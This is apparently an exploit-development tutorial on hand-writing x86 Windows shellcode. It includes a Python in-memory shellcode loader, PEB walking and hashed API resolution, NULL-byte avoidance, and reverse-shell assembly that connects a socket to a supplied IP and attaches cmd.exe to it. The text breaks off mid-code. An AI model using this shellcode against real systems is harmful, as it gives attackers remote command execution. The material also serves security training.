## Custom Shellcode x86

## Shellcode?

Shellcode is a small piece of code used as the payload in the exploitation of software vulnerabilities. The term "shellcode" originally referred to code that would start a command shell (like a Unix/Linux shell or Windows command prompt) when executed, giving an attacker control over the target system. However, over time, the term has come to refer to any small set of code that an attacker uses to exploit a vulnerability and execute arbitrary commands on a target system.

### Key Characteristics of Shellcode:

- Small and Self-contained: Shellcode is designed to be small and self-contained, meaning it doesn’t rely on external libraries or functions. This makes it easier to inject into a vulnerable program.

- Executed Directly by the CPU: Shellcode is usually written in machine code (binary) or low-level assembly language, which is directly executed by the CPU of the target machine.

- Payload of an Exploit: In the context of a security exploit, shellcode is the actual code that gets executed after the vulnerability is exploited. The exploit itself is the method used to deliver the shellcode to the vulnerable program.

- Variety of Functions: While the original shellcode was meant to open a command shell, modern shellcodes can perform a wide range of actions, such as downloading and executing additional malware, opening a reverse shell, escalating privileges, or modifying files.

### How Shellcode Works:

- Injection: The attacker finds a vulnerability in the target program, such as a buffer overflow, that allows them to inject shellcode into the program's memory.

- Execution: Once injected, the vulnerability is exploited in such a way that the flow of execution in the program is redirected to the shellcode.

- Payload Execution: The shellcode is then executed by the CPU, carrying out the attacker's intended actions, such as opening a remote shell or downloading malicious software.

### Example of Shellcode Use:

- Buffer Overflow: An attacker might exploit a buffer overflow vulnerability in a program, where input data is written outside the bounds of the allocated buffer. The attacker crafts input that includes the shellcode, overwrites the return address on the stack, and causes the program to jump to the shellcode instead of returning normally.

- Return-to-libc Attack: Instead of injecting shellcode directly, an attacker could redirect execution to existing code in the program’s memory, such as functions in the libc library, with the shellcode used to chain together the necessary function calls.

## How to call functions?

In x86 architecture, calling conventions define how functions receive parameters from the caller, how the return value is provided, how the stack is managed, and which registers need to be preserved across function calls. These conventions are essential for ensuring that the caller and the callee agree on how data is passed and managed.

### stdcall (Standard Call)

- Parameters: Passed on the stack, from right to left.

- Return Value: Stored in the EAX register.

- Stack Cleanup: The callee is responsible for cleaning up the stack before returning.

- Register Preservation: The callee must preserve EBX, ESI, EDI, and EBP.

- Usage: Commonly used in WinAPI functions.

### fastcall

- Parameters: The first two parameters are passed in the ECX and EDX registers (if they fit), with the remaining parameters passed on the stack from right to left.

- Return Value: Stored in the EAX register.

- Stack Cleanup: The callee is responsible for cleaning up the stack.

- Register Preservation: The callee must preserve EBX, ESI, EDI, and EBP.

- Usage: Used for performance optimization by reducing the number of stack accesses.

### In summary...

![](/assets/img/more_images/2024-08-18_00-32.png)
![](/assets/img/more_images/2024-08-18_00-38.png)

## Key Aspects of the System Call Problem on Windows

### Lack of Direct System Call Interface:
- Unlike Unix-like systems (such as Linux), where system calls are well-documented and can be invoked directly by user-mode applications, Windows does not provide a stable or public API for directly invoking system calls. Instead, applications typically interact with the Windows kernel through higher-level APIs provided by system libraries like kernel32.dll or ntdll.dll.

- This abstraction makes it difficult for developers to use system calls directly, as they are expected to use the Windows API instead. Directly invoking system calls by bypassing the official APIs is considered risky and can lead to compatibility issues with different versions of Windows.

### Syscall Numbering and Versioning:
- The numbers associated with specific system calls (syscall numbers) can vary between different versions of Windows. This means that code relying on specific syscall numbers may break when running on different Windows versions or after updates, as the syscall numbers might change.

- This volatility is a significant challenge for low-level developers, such as those writing malware, security software, or performance optimizations, where precise control over system calls is desired.

Without system calls, our only option for communicating directly with the kernel is to use the Windows API, which is exported by dynamic-link libraries (DLLs) that are mapped into process memory space at runtime. If DLLs are not already loaded into the process space, we need to load them and locate the functions they export. Once the functions have been located, we can invoke them as part of our shellcode in order to perform specific tasks.

Fortunately, kernel32.dll exposes functions that can be used to accomplish both of these tasks, and is likely to be mapped into the process space.

For our shellcode to work, we will need to find another way to obtain the base address of kernel32.dll. Then, we'll have to figure out how to resolve various function addresses from kernel32.dll and any other required DLLs. Finally, we will learn how to invoke our resolved functions to achieve various results, such as a reverse shell.

## Finding kernel32

We need to start locating this DLL because it contains all APIs required to load additional DLLs and resolve functions within them, namely LoadLibrary and GetProcAddress.

We will explore the PEB method to find the DLL.

### Understanding the PEB (Process Environment Block)

The PEB is a data structure in Windows that contains information about the process, including a list of all loaded modules (DLLs). The PEB resides in the user space of a process, meaning it is accessible from within the process itself, and it contains various fields that provide detailed information about the process's environment.

On a 32-bit Windows system, the PEB can be accessed via the "FS:[0x30]" segment register. These segment registers contain pointers to the Thread Environment Block (TEB), which in turn contains a pointer to the PEB.

The PEB struct is the following:

```cpp
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;
```

As we can see, it has a pointer to the "PEB_LDR_DATA" structure, which in turn contains a linked list of all loaded modules.

The "InMemoryOrderModuleList" is one of the linked lists in the "PEB_LDR_DATA" structure, where each entry corresponds to a loaded module.

Each entry in the InMemoryOrderModuleList is a "LDR_DATA_TABLE_ENTRY" structure, which contains information about a loaded module, including its base address, the full DLL path, and the DLL name. By iterating through this list, you can search for a specific DLL by name or by some other criteria.

Once you find the entry corresponding to the desired DLL, you can extract information such as the base address of the DLL, which allows you to use its functions directly or access its memory.

We are going to test all of this with WinDbg and the "Sync Breeze" server (attaching WinDbg to it).

![](/assets/img/more_images/2024-08-18_01-04.png)

The image shows that at offset 0x30 we have a pointer to the PEB structure.

Now we are going to find the Ldr pointer.

![](/assets/img/more_images/2024-08-18_01-06.png)

The pointer to the "_PEB_LDR_DATA" structure, is located at offset 0x0C inside the PEB. Let's inspect the "_PEB_LDR_DATA" structure.

![](/assets/img/more_images/2024-08-18_01-09.png)

We find three linked lists, each of which offers a different ordering of the loaded modules:

- **InLoadOrderModuleList** shows the previous and next module in load order.

- **InMemoryOrderModuleList** shows the previous and next module in memory placement order.

- **InInitializationOrderModuleList** shows the previous and next module in initialization order.

The "InInitializationOrderModuleList" structure has two fields:

![](/assets/img/more_images/2024-08-18_01-16.png)

The Flink and Blink fields are commonly used in doubly-linked lists to access the next (Flink) or previous (Blink) entry in the list.

The "_LIST_ENTRY" structure is embedded as part of a larger structure of type "_LDR_DATA_TABLE_ENTRY_".

![](/assets/img/more_images/2024-08-18_01-20.png)

The structure contains a field called DllBase. As the name suggests, this field holds the DLL's base address. We can also obtain the name of the DLL using the BaseDllName field.

### Writing the Assembly Code

We will use the Keystone Framework in order to assemble our shellcode. We will also use the "CTypes" Python library, which will help us run this code directly in the memory space of the process using several Windows APIs.

Our Python script will...

- Transform our ASM code into opcodes using the Keystone framework.

- Allocate a chunk of memory for our shellcode.

- Copy our shellcode to the allocated memory.

- Execute the shellcode from the allocated memory.

We start importing the required libraries and defining a "CODE" variable which will be used to store our assembly code (we also initialize the Keystone engine in 32-bit mode).

```py
import ctypes, struct
from keystone import *

CODE = (

)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
```

We invoke the "asm" method to compile our instructions and store the opcodes in the shellcode variable.

```py
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)
```
Now, we will use the "CTypes" library to invoke some functions.

```py
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))                                     
```
The "input" function allows us to stop the execution and attack WinDbg to the process.

The other functions are used to allocate the memory, copy the opcodes to the new memory page, and run the shellcode in a new thread.

Let's start adding the assembly code.

```py
CODE = (
        "start:                              "
        "   mov ebp, esp                    ;"
        "   sub esp, 0x200                  ;"
)
```

We emulate an actual function call and subtract an offset from the stack, so it does not get clobbered, that means that the call stack has been corrupted or overwritten in a way that causes unintended behavior.

The next step is write the functions that finds kernel32.

```py
"find_kernel32:                         "
"   xor ecx, ecx                        ;"  #   ECX = 0
"   mov esi, fs:[ecx+0x30]              ;"  #   ESI = &(PEB)
"   mov esi, [esi+0x0C]                 ;"  #   ESI = PEB->Ldr
"   mov esi, [esi+0x1C]                 ;"  #   ESI = PEB->Ldr.InInitOrder
```

Now, we need to include the "next_module" function, that jumps to the next module if the comparison is not successful.

```py
"next_module:                            "
"   mov ebx, [esi+0x8]                  ;"  #   EBX = InInitOrder[x].base_address
"   mov edi, [esi+0x20]                 ;"  #   EDI = InInitOrder[x].module_name
"   mov esi, [esi]                      ;"  #   ESI = InInitOrder[x].flink
"   cmp [edi+12*2], cx                  ;"  #   module_name[12] == 0x00 ?
"   jne next_module                     ;"  #   jump to the next module
"   ret                                 ;"
```

The reason for we multiply "12*2" lies in the fact that the length of the "kernel32.dll" string is 12 bytes. Because the string is stored in UNICODE format, every character of the string will be represented as a WORD rather than a byte, making the length 24 in Unicode. 

## Other functions and symbols

We have to traverse the Export Address Table (EAT) of a DLL to obtain the functions addresses that the library is importing.

### Export Address Table

The EAT is a key component of a Portable Executable (PE) file, dynamic link libraries (DLLs), and other executable files. The EAT is part of the PE file's export section, and its primary purpose is to provide the addresses of functions or variables that the module (typically a DLL) exports for use by other modules.

### Export Directory Table

The Export Address Table (EAT) and the Export Directory Table are related but not the same. They are both components of the export section in a Portable Executable (PE) file, but they serve different purposes.

- **Export Directory Table** is the higher-level structure that contains metadata about all exports and references other export-related tables, including the Export Address Table.

- **Export Address Table (EAT)** is a lower-level structure specifically holding the memory addresses of the exported functions or variables.

The Export Directory Table contains several fields that describe the export data:

```cpp
typedef struct _IMAGE_EXPORT_DIRECTORY {
  DWORD Characteristics;
  DWORD TimeDateStamp;
  WORD MajorVersion;
  WORD MinorVersion;
  DWORD Name;
  DWORD Base;
  DWORD NumberOfFunctions;
  DWORD NumberOfNames;
  DWORD AddressOfFunctions;
  DWORD AddressOfNames;
  DWORD AddressOfNameOrdinals;
}
```

The AddressOfFunctions, AddressOfNames, and AddressOfNameOrdinals are three key arrays in the Export Directory Table structure. These arrays are interrelated, and each plays a specific role in mapping function names and ordinals to their actual memory addresses.

Let's consider a DLL exporting three functions: FuncA, FuncB, and FuncC.

#### AddressOfNames:
  - Entry 0: RVA to string "FuncA"
  - Entry 1: RVA to string "FuncB"
  - Entry 2: RVA to string "FuncC"

#### AddressOfNameOrdinals:
  - Entry 0: Ordinal 2 (indicating FuncA maps to the 2nd entry in AddressOfFunctions)
  - Entry 1: Ordinal 0 (indicating FuncB maps to the 0th entry in AddressOfFunctions)
  - Entry 2: Ordinal 1 (indicating FuncC maps to the 1st entry in AddressOfFunctions)

#### AddressOfFunctions:
  - Entry 0: RVA of FuncB
  - Entry 1: RVA of FuncC
  - Entry 2: RVA of FuncA

#### Summary:

  - AddressOfFunctions holds the addresses of exported functions.
  - AddressOfNames contains pointers to the names of these functions.
  - AddressOfNameOrdinals connects function names to their corresponding ordinals, which are used to index the AddressOfFunctions array.

### Back to the Assembly

Remember that the Export Directory Table structure fields contain relative addresses. To obtain the virtual memory address, our shellcode will often add the kernel32.dll base address to the RVA.

We have the following code:

```py
CODE = (
  "start:                                  "
  "   mov ebp, esp                        ;"
  "   sub esp, 0x200                      ;"
  "   call find_kernel32                  ;"
  "   call find_function                  ;"

  "find_kernel32:                          "
  "   xor ecx, ecx                        ;"  #   ECX = 0
  "   mov esi, fs:[ecx+0x30]              ;"  #   ESI = &(PEB)
  "   mov esi, [esi+0x0C]                 ;"  #   ESI = PEB->Ldr
  "   mov esi, [esi+0x1C]                 ;"  #   ESI = PEB->Ldr.InInitOrder

  "next_module:                            "
  "   mov ebx, [esi+0x8]                  ;"  #   EBX = InInitOrder[x].base_address
  "   mov edi, [esi+0x20]                 ;"  #   EDI = InInitOrder[x].module_name
  "   mov esi, [esi]                      ;"  #   ESI = InInitOrder[x].flink
  "   cmp [edi+12*2], cx                  ;"  #   module_name[12] == 0x00 ?
  "   jne next_module                     ;"  #   jump to the next module
  "   ret                                 ;"

  "find_function:                          "
  "   pushad                              ;"  #   Save all registers
  "   mov eax, [ebx+0x3c]                 ;"  #   Offset to PE Signature
  "   mov edi, [ebx+eax+0x78]             ;"  #   Export Table Directory RVA
  "   add edi, ebx                        ;"  #   Export Table Directory VMA
  "   mov ecx, [edi+0x18]                 ;"  #   NumberOfNames
  "   mov eax, [edi+0x20]                 ;"  #   AddressOfNames RVA
  "   add eax, ebx                        ;"  #   AddressOfNames VMA
  "   mov [ebp-4], eax                    ;"  #   Save AddressOfNames VMA

  "find_function_loop:                     "
  "   jecxz find_function_finished        ;"  #   jump if ECX == 0
  "   dec ecx                             ;"  #   Decrement names counter
  "   mov eax, [ebp-4]                    ;"  #   Restore AddressOfNames VMA
  "   mov esi, [eax+ecx*4]                ;"  #   RVA of the symbol name
  "   add esi, ebx                        ;"  #   ESI = (VMA of the current symbol name)

  "find_function_finished:                 "
  "   popad                               ;"  #   Restore registers
)
```

Now we have to parse the symbol names using a hashing algorithm to search for this symbol in the array.

```py
"compute_hash:                             " 
  "   xor eax, eax                        ;"  #   EAX = 0
  "   cdq                                 ;"  #   EDX = 0
  "   cld                                 ;"  #   Clear direction flag (DF)

  "compute_hash_again:                     "
  "   lodsb                               ;"  #   Load the next byte from esi into al
  "   test al, al                         ;"  #   Check for NULL terminator
  "   jz compute_hash_finished            ;"  #   If the ZF is set, we've hit the NULL terminator
  "   ror edx, 0x0d                       ;"  #   Rotate edx 13 bits to the right
  "   add edx, eax                        ;"  #   Add the new byte to the accumulator
  "   jmp compute_hash_again              ;"  #   Next iteration

  "compute_hash_finished:                  "
```

We can write a simple Python script that performs the same operation so that we will be able to compute the hash of a function name that our shellcode will search for:

```py
def ror_str(byte, count):
  binb = numpy.base_repr(byte, 2).zfill(32)
  while count > 0:
    binb = binb[-1] + binb[0:-1]
    count -= 1
  return (int(binb, 2))

def push_function_hash(function_name):
    edx = 0x00
    count = 0
    
    for eax in function_name:
        edx = edx + ord(eax)
        if count < len(function_name)-1:
            edx = ror_str(edx, 0xd)
        count += 1
    
    return ("push " + hex(edx))

push_terminateprocess_hash = push_function_hash("TerminateProcess")
push_loadlibrarya_hash = push_function_hash("LoadLibraryA")
push_createprocessa_hash = push_function_hash("CreateProcessA")
push_wsastartup_hash = push_function_hash("WSAStartup")
push_wsasocketa_hash = push_function_hash("WSASocketA")
push_wsaconnect_hash = push_function_hash("WSAConnect")
```

We need to introduce an additional function that will compare the hash from EDX with the one generated by our Python script.

Besides, we are going to modify the "CODE" variable to be able to include python functions.

```py
CODE = [
        "start:                                  ",
        "   mov ebp, esp                        ;",
        "   sub esp, 0x200                      ;",
        "   call find_kernel32                  ;",
        push_terminateprocess_hash,
        "   call find_function                  ;",
        "   xor ecx, ecx                        ;",  #   ECX = 0
        "   push ecx                            ;",  #   uExitCode
        "   push 0xffffffff                     ;",  #   hProcess
        "   call eax                            ;",  #   Call TerminateProcess

        "find_kernel32:                          ",
        "   xor ecx, ecx                        ;",  #   ECX = 0
        "   mov esi, fs:[ecx+0x30]              ;",  #   ESI = &(PEB)
        "   mov esi, [esi+0x0C]                 ;",  #   ESI = PEB->Ldr
        "   mov esi, [esi+0x1C]                 ;",  #   ESI = PEB->Ldr.InInitOrder

        "next_module:                            ",
        "   mov ebx, [esi+0x8]                  ;",  #   EBX = InInitOrder[x].base_address
        "   mov edi, [esi+0x20]                 ;",  #   EDI = InInitOrder[x].module_name
        "   mov esi, [esi]                      ;",  #   ESI = InInitOrder[x].flink
        "   cmp [edi+12*2], cx                  ;",  #   module_name[12] == 0x00 ?
        "   jne next_module                     ;",  #   jump to the next module
        "   ret                                 ;",

        "find_function:                          ",
        "   pushad                              ;",  #   Save all registers
        "   mov eax, [ebx+0x3c]                 ;",  #   Offset to PE Signature
        "   mov edi, [ebx+eax+0x78]             ;",  #   Export Table Directory RVA
        "   add edi, ebx                        ;",  #   Export Table Directory VMA
        "   mov ecx, [edi+0x18]                 ;",  #   NumberOfNames
        "   mov eax, [edi+0x20]                 ;",  #   AddressOfNames RVA
        "   add eax, ebx                        ;",  #   AddressOfNames VMA
        "   mov [ebp-4], eax                    ;",  #   Save AddressOfNames VMA

        "find_function_loop:                     ",
        "   jecxz find_function_finished        ;",  #   jump if ECX == 0
        "   dec ecx                             ;",  #   Decrement names counter
        "   mov eax, [ebp-4]                    ;",  #   Restore AddressOfNames VMA
        "   mov esi, [eax+ecx*4]                ;",  #   RVA of the symbol name
        "   add esi, ebx                        ;",  #   ESI = (VMA of the current symbol name)       

        "compute_hash:                           ", 
        "   xor eax, eax                        ;",  #   EAX = 0
        "   cdq                                 ;",  #   EDX = 0
        "   cld                                 ;",  #   Clear direction flag (DF)

        "compute_hash_again:                     ",
        "   lodsb                               ;",  #   Load the next byte from esi into al
        "   test al, al                         ;",  #   Check for NULL terminator
        "   jz compute_hash_finished            ;",  #   If the ZF is set, we've hit the NULL terminator
        "   ror edx, 0x0d                       ;",  #   Rotate edx 13 bits to the right
        "   add edx, eax                        ;",  #   Add the new byte to the accumulator
        "   jmp compute_hash_again              ;",  #   Next iteration

        "compute_hash_finished:                  ", 
        
        "find_function_compare:                  ",
        "   cmp edx, [esp+0x24]                 ;",  #   Compare hashes
        "   jnz find_function_loop              ;",  #   jump if it does not match
        "   mov edx, [edi+0x24]                 ;",  #   AddressOfNameOrdinals RVA
        "   add edx, ebx                        ;",  #   AddressOfNameOrdinals VMA
        "   mov cx, [edx+2*ecx]                 ;",  #   Extrapolate the function's ordinal
        "   mov edx, [edi+0x1c]                 ;",  #   AddressOfFunctions RVA
        "   add edx, ebx                        ;",  #   AddressOfFunctions VMA
        "   mov eax, [edx+4*ecx]                ;",  #   Get the function RVA
        "   add eax, ebx                        ;",  #   Get the function VMA
        "   mov [esp+0x1c], eax                 ;",
        
        "find_function_finished:                 ",
        "   popad                               ;",  #   Restore registers
        "   ret                                 ;",
]
```

## Null-Free and Position-Independent Shellcode
The opcode contains NULL bytes, so we have to avoid these bytes. The first instruction that contains NULL bytes is "sub esp, 0x200". We can use the following instruction to obtain the same goal.

```
add esp, 0xfffffdf0
```

That's because the following operation:

```
0x0 - 0x210 == 0xfffffdf0
```

The next problem is that our CALL instructions are generating NULL bytes, each CALL will contain a relative offset to the function. We can move all the functions being called above the CALL instructions, in that way, this would generate a negative offset avoiding NULL bytes.

```py
CODE = [
        "start:                                  ",
        "   mov ebp, esp                        ;",
        "   add esp, 0xfffffdf0                 ;",  #   Avoid NULL bytes

        "find_kernel32:                          ",
        "   xor ecx, ecx                        ;",  #   ECX = 0
        "   mov esi, fs:[ecx+0x30]              ;",  #   ESI = &(PEB)
        "   mov esi, [esi+0x0C]                 ;",  #   ESI = PEB->Ldr
        "   mov esi, [esi+0x1C]                 ;",  #   ESI = PEB->Ldr.InInitOrder

        "next_module:                            ",
        "   mov ebx, [esi+0x8]                  ;",  #   EBX = InInitOrder[x].base_address
        "   mov edi, [esi+0x20]                 ;",  #   EDI = InInitOrder[x].module_name
        "   mov esi, [esi]                      ;",  #   ESI = InInitOrder[x].flink
        "   cmp [edi+12*2], cx                  ;",  #   module_name[12] == 0x00 ?
        "   jne next_module                     ;",  #   jump to the next module

        "find_function_shorten:                  ",
        "   jmp find_function_shorten_bnc       ;",  #   Short jump

        "find_function_ret:                      ",
        "   pop esi                             ;",  #   POP the return address from the stack
        "   mov [ebp+0x04], esi                 ;",  #   Save find_function address for later usage
        "   jmp resolve_symbols_kernel32        ;",

        "find_function_shorten_bnc:              ",
        "   call find_function_ret              ;",  #   Relative CALL with negative offset

        "find_function:                          ",
        "   pushad                              ;",  #   Save all registers
        "   mov eax, [ebx+0x3c]                 ;",  #   Offset to PE Signature
        "   mov edi, [ebx+eax+0x78]             ;",  #   Export Table Directory RVA
        "   add edi, ebx                        ;",  #   Export Table Directory VMA
        "   mov ecx, [edi+0x18]                 ;",  #   NumberOfNames
        "   mov eax, [edi+0x20]                 ;",  #   AddressOfNames RVA
        "   add eax, ebx                        ;",  #   AddressOfNames VMA
        "   mov [ebp-4], eax                    ;",  #   Save AddressOfNames VMA

        "find_function_loop:                     ",
        "   jecxz find_function_finished        ;",  #   jump if ECX == 0
        "   dec ecx                             ;",  #   Decrement names counter
        "   mov eax, [ebp-4]                    ;",  #   Restore AddressOfNames VMA
        "   mov esi, [eax+ecx*4]                ;",  #   RVA of the symbol name
        "   add esi, ebx                        ;",  #   ESI = (VMA of the current symbol name)       

        "compute_hash:                           ", 
        "   xor eax, eax                        ;",  #   EAX = 0
        "   cdq                                 ;",  #   EDX = 0
        "   cld                                 ;",  #   Clear direction flag (DF)

        "compute_hash_again:                     ",
        "   lodsb                               ;",  #   Load the next byte from esi into al
        "   test al, al                         ;",  #   Check for NULL terminator
        "   jz compute_hash_finished            ;",  #   If the ZF is set, we've hit the NULL terminator
        "   ror edx, 0x0d                       ;",  #   Rotate edx 13 bits to the right
        "   add edx, eax                        ;",  #   Add the new byte to the accumulator
        "   jmp compute_hash_again              ;",  #   Next iteration

        "compute_hash_finished:                  ", 
        
        "find_function_compare:                  ",
        "   cmp edx, [esp+0x24]                 ;",  #   Compare hashes
        "   jnz find_function_loop              ;",  #   jump if it does not match
        "   mov edx, [edi+0x24]                 ;",  #   AddressOfNameOrdinals RVA
        "   add edx, ebx                        ;",  #   AddressOfNameOrdinals VMA
        "   mov cx, [edx+2*ecx]                 ;",  #   Extrapolate the function's ordinal
        "   mov edx, [edi+0x1c]                 ;",  #   AddressOfFunctions RVA
        "   add edx, ebx                        ;",  #   AddressOfFunctions VMA
        "   mov eax, [edx+4*ecx]                ;",  #   Get the function RVA
        "   add eax, ebx                        ;",  #   Get the function VMA
        "   mov [esp+0x1c], eax                 ;",
        
        "find_function_finished:                 ",
        "   popad                               ;",  #   Restore registers
        "   ret                                 ;",

        "resolve_symbols_kernel32:               ",
        push_terminateprocess_hash,                  #   TerminateProcess hash
        "   call dword ptr [ebp+0x04]           ;",  #   Call find_function
        "   mov [ebp+0x10], eax                 ;",  #   Save TerminateProcess address for later
]
```

## Reverse Shell

In this chapter, we will explore how to create a reverse shell.

Most of the required APIs are exported by ws2_32.dll. We first need to initialize the Winsock DLL using WSAStartup. This is followed by a call to WSASocketA to create the socket, and finally WSAConnect to establish the connection.

First of all, we need to convert the IP and Port to hexadecimal:

```py
def hex_ip(ip_address):
    ip_addr_hex = []
    for block in ip_address.split("."):
        ip_addr_hex.append(format(int(block), "02x"))
    ip_addr_hex.reverse()
    return "0x" + "".join(ip_addr_hex)


def hex_port(port):
    port_hex = format(int(port), "04x")
    return "0x" + str(port_hex[2:4]) + str(port_hex[0:2])
```

Next to initiate the connection, we need to start a cmd.exe process. We will use the CreateProcessA API.

```cpp
BOOL CreateProcessA(
  LPCSTR lpApplicationName,
  LPSTR lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL bInheritHandles,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCSTR lpCurrentDirectory,
  LPSTARTUPINFOA lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

```py
        push_loadlibrarya_hash,                # LoadLibraryA hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        "       mov [ebp+0x14], eax             ;",  # Save LoadLibraryA address for later
        push_createprocessa_hash,              # CreateProcessA hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        "       mov [ebp+0x18], eax             ;",  # Save CreateProcessA address for later
        "   load_ws2_32:                         ",
        "       xor eax, eax                    ;",  # Null EAX
        "       mov ax, 0x6c6c                  ;",  # Move the end of the string in AX
        "       push eax                        ;",  # Push EAX on the stack with string NULL terminator
        "       push 0x642e3233                 ;",  # Push part of the string on the stack
        "       push 0x5f327377                 ;",  # Push another part of the string on the stack
        "       push esp                        ;",  # Push ESP to have a pointer to the string
        "       call dword ptr [ebp+0x14]       ;",  # Call LoadLibraryA
        "   resolve_symbols_ws2_32:              ",
        "       mov ebx, eax                    ;",  # Move the base address of ws2_32.dll to EBX
        push_wsastartup_hash,                  # WSAStartup hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        "       mov [ebp+0x1C], eax             ;",  # Save WSAStartup address for later usage
        push_wsasocketa_hash,                  # WSASocketA hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        "       mov [ebp+0x20], eax             ;",  # Save WSASocketA address for later usage
        push_wsaconnect_hash,                  # WSAConnect hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        "       mov [ebp+0x24], eax             ;",  # Save WSAConnect address for later usage
        "   call_wsastartup:                    ;",
        "       mov eax, esp                    ;",  # Move ESP to EAX
        "       xor ecx, ecx                    ;",
        "       mov cx, 0x590                   ;",  # Move 0x590 to CX
        "       sub eax, ecx                    ;",  # Substract CX from EAX to avoid overwriting the structure later
        "       push eax                        ;",  # Push lpWSAData
        "       xor eax, eax                    ;",  # Null EAX
        "       mov ax, 0x0202                  ;",  # Move version to AX
        "       push eax                        ;",  # Push wVersionRequired
        "       call dword ptr [ebp+0x1C]       ;",  # Call WSAStartup
        "   call_wsasocketa:                     ",
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push dwFlags
        "       push eax                        ;",  # Push g
        "       push eax                        ;",  # Push lpProtocolInfo
        "       mov al, 0x06                    ;",  # Move AL, IPPROTO_TCP
        "       push eax                        ;",  # Push protocol
        "       sub al, 0x05                    ;",  # Substract 0x05 from AL, AL = 0x01
        "       push eax                        ;",  # Push type
        "       inc eax                         ;",  # Increase EAX, EAX = 0x02
        "       push eax                        ;",  # Push af
        "       call dword ptr [ebp+0x20]       ;",  # Call WSASocketA
        "   call_wsaconnect:                     ",
        "       mov esi, eax                    ;",  # Move the SOCKET descriptor to ESI
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push sin_zero[]
        "       push eax                        ;",  # Push sin_zero[]
        f"      push {hex_ip(sys.argv[1])}      ;",  # Push address
        f"      mov ax, {hex_port(sys.argv[2])} ;",  # Move port
        "       shl eax, 0x10                   ;",  # Left shift EAX by 0x10 bytes
        "       add ax, 0x02                    ;",  # Add 0x02 (AF_INET) to AX
        "       push eax                        ;",  # Push sin_port & sin_family
        "       push esp                        ;",  # Push pointer to the sockaddr_in structure
        "       pop edi                         ;",  # Store pointer to sockaddr_in in EDI
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push lpGQOS
        "       push eax                        ;",  # Push lpSQOS
        "       push eax                        ;",  # Push lpCalleeData
        "       push eax                        ;",  # Push lpCalleeData
        "       add al, 0x10                    ;",  # Set AL to 0x10
        "       push eax                        ;",  # Push namelen
        "       push edi                        ;",  # Push *name
        "       push esi                        ;",  # Push s
        "       call dword ptr [ebp+0x24]       ;",  # Call WSAConnect
        "   create_startupinfoa:                 ",
        "       push esi                        ;",  # Push hStdError
        "       push esi                        ;",  # Push hStdOutput
        "       push esi                        ;",  # Push hStdInput
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push lpReserved2
        "       push eax                        ;",  # Push cbReserved2 & wShowWindow
        "       mov al, 0x80                    ;",  # Move 0x80 to AL
        "       xor ecx, ecx                    ;",  # Null ECX
        "       mov cl, 0x80                    ;",  # Move 0x80 to CX
        "       add eax, ecx                    ;",  # Set EAX to 0x100
        "       push eax                        ;",  # Push dwFlags
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push dwFillAttribute
        "       push eax                        ;",  # Push dwYCountChars
        "       push eax                        ;",  # Push dwXCountChars
        "       push eax                        ;",  # Push dwYSize
        "       push eax                        ;",  # Push dwXSize
        "       push eax                        ;",  # Push dwY
        "       push eax                        ;",  # Push dwX
        "       push eax                        ;",  # Push lpTitle
        "       push eax                        ;",  # Push lpDesktop
        "       push eax                        ;",  # Push lpReserved
        "       mov al, 0x44                    ;",  # Move 0x44 to AL
        "       push eax                        ;",  # Push cb
        "       push esp                        ;",  # Push pointer to the STARTUPINFOA structure
        "       pop edi                         ;",  # Store pointer to STARTUPINFOA in EDI
        "   create_cmd_string:                   ",
        "       mov eax, 0xff9a879b             ;",  # Move 0xff9a879b into EAX
        "       neg eax                         ;",  # Negate EAX, EAX = 00657865
        "       push eax                        ;",  # Push part of the "cmd.exe" string
        "       push 0x2e646d63                 ;",  # Push the remainder of the "cmd.exe"
        "       push esp                        ;",  # Push pointer to the "cmd.exe" string
        "       pop ebx                         ;",  # Store pointer to the "cmd.exe" string
        "   call_createprocessa:                 ",
        "       mov eax, esp                    ;",  # Move ESP to EAX
        "       xor ecx, ecx                    ;",  # Null ECX
        "       mov cx, 0x390                   ;",  # Move 0x390 to CX
        "       sub eax, ecx                    ;",  # Substract CX from EAX to avoid overwriting the structure later
